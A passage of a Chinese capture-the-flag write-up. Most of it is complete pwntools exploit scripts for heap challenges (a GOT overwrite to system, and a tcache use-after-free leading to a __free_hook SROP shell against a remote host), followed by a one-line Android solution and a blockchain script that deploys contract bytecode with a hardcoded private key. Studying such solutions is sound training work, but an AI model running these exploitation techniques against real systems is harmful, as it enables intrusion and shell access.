    add(2, 0x68)
    add(3, 0x18)
    add(4, 0x100)
    add(5, 0x18)
    add(14, 0x71, '/bin/sh\0')
    free(0)
    add(0, 0x18, 'a'*0x18+p8(0xa1))
    free(1)
    add(1, 0x90, p8(0x78))
    show(1)
    p.recvuntil('Content : ')
    libc = ELF(remote_libc_path)
    libc.address = str2int(p.recv(6).ljust(7, '\0'), 'libc', libc.sym['__malloc_hook']+0x68)
    free(2)
    attack = 0x602120 - 0x10
    one = libc.address + one_gadget()[1]
    edit(1, flat('a'*0x28, 0x71, attack))
    add(6, 0x68)
    add(7, 0x68, p64(0x602018)*2)
    edit(1, p64(libc.sym['system']))
    free(14)
    p.interactive()
###  greentownnote
uaf，2.27无限free填充tcache，再free得到unsortedbin泄露libc，打free_hook为setcontext+0x35，SROP，getshell
    #coding:utf-8
    from pwn import *
    import subprocess, sys, os
    from dawnaa import SROP
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './GreentownNote'
    ip = '82.157.5.28'
    port = 51001
    remote_libc_path = './libc-2.27.so'
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    def run(local = 1):
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            p = elf.process()
        else:
            p = remote(ip, port)
    def debug(cmd=''):
        # context.terminal = []
        gdb.attach(p,cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def str2int(s, info = '', offset = 0):
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('> Your choice :', str(idx))
    def add(size, content = '\n'):
        chose(1)
        sla('> Note size :', str(size))
        sa('> Content :', content)
    def free(idx):
        chose(3)
        sla('| Index :', str(idx))
    def show(idx):
        chose(2)
        sla('| Index :', str(idx))
    run(0)
    add(0x100)
    add(0x100)
    for i in range(7):
        free(1)
    free(0)
    show(0)
    p.recvuntil('| Content: ')
    libc = ELF(remote_libc_path)
    libc.address = str2int(p.recv(6).ljust(8, '\0'), 'libc', libc.sym['__malloc_hook']+0x70)
    add(0x100, p64(libc.sym['__free_hook']))
    payload, layout, attack = SROP(libc)
    add(0x100, payload)
    add(0x100, p64(attack))
    free(1)
    p.send(layout)
    p.interactive()
## 创新技术
###  安卓
很简单的题目，会发送http请求到靶机，只需要用JEB动态调试，在初始化类时将权限改为admin，之后发送请求即可。直接返回flag
###  区块链puzzle
考察 整数溢出
出题人没有设置RN,
可以直接similar contract找到他原来的做题记录。
    import web3
    import time
    from web3 import Web3,HTTPProvider
    from web3.auto import w3
    from Crypto.Util.number import *
    RINKEDBY_URL = "https://ropsten.infura.io/v3/097c700c39fd46be8178f46b6889e78c"
    web3=Web3(HTTPProvider(RINKEDBY_URL))
    print(web3.isConnected())
    acct=web3.eth.account.from_key('0x03c70d2e6e93d23f0bec4c44e117985b023ecf348172c996b02882a105f1bdc5')
    pub = acct.address
    pri = acct.privateKey
    print(acct.address,acct.privateKey)
    gasPrice = web3.eth.gasPrice
    chain_id = web3.eth.chain_id
    nonce = web3.eth.getTransactionCount(pub)
    def sendRawTransaction(fromAddr,toaddr,data,nonce,gasPrice = gasPrice,chain_id = chain_id,value = 0):
        if toaddr == None:
            rawTx = { 'chainId':3, 'from': fromAddr, 'nonce': nonce, 'gasPrice': gasPrice, 'gas': 5000000, 'value': value, 'data': data, }
        else:
            rawTx = { 'chainId':3, 'to':toaddr, 'from': fromAddr, 'nonce': nonce, 'gasPrice': gasPrice, 'gas': 5000000, 'value': value, 'data': data, }
        signedTx = web3.eth.account.signTransaction(rawTx, private_key=pri)
        hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()
        print(hashTx)
        receipt = web3.eth.waitForTransactionReceipt(hashTx)
        print(receipt)
        return receipt
    payload =bytes.fromhex('608060405234801561001057600080fd5b5060405160208061096a83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506108e7806100836000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638f4ed3331461005c578063d40a71fb14610073578063df4ec2491461008a575b600080fd5b34801561006857600080fd5b506100716100a1565b005b34801561007f57600080fd5b50610088610243565b005b34801561009657600080fd5b5061009f61071d565b005b600069424a44264441534354467601000000000000000000000000000000000000000000000290506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663707583d5826040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808275ffffffffffffffffffffffffffffffffffffffffffff191675ffffffffffffffffffffffffffffffffffffffffffff19168152602001915050600060405180830381600087803b15801561018b57600080fd5b505af115801561019f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663919840ad6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561022857600080fd5b505af115801561023c573d6000803e3d6000fd5b5050505050565b600061024d6107bc565b90506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633472df228273ffffffffffffffffffffffffffffffffffffffff6040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050600060405180830381600087803b15801561032757600080fd5b505af115801561033b573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639527008060006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156103d057600080fd5b505af11580156103e4573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633472df228273ffffffffffffffffffffffffffffffffffffffff6040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050600060405180830381600087803b1580156104c057600080fd5b505af11580156104d4573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639527008060006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561056957600080fd5b505af115801561057d573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633472df228273ffffffffffffffffffffffffffffffffffffffff6040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050600060405180830381600087803b15801561065957600080fd5b505af115801561066d573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639527008060006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561070257600080fd5b505af1158015610716573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f96339306040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156107a257600080fd5b505af11580156107b6573d6000803e3d6000fd5b50505050565b600080600080600080600294506000935084604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561082257805182526020820191506020810190506020830392506107fd565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600190049250828411156108675782840391506108b0565b8284141561087857600091506108af565b828410156108ae577fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9050836001848303010191505b5b5b8195505050505050905600a165627a7a72305820bd573733d36278252bc4754039d0930b28f3a71e3f8d56ca5e304cd5351846380029000000000000000000000000442787DBF8f75F0A3eF14616f8f698b0d620Cf09')
    receipt = sendRawTransaction(pub,None,payload,nonce)
    print(receipt)
部署完直接打即可。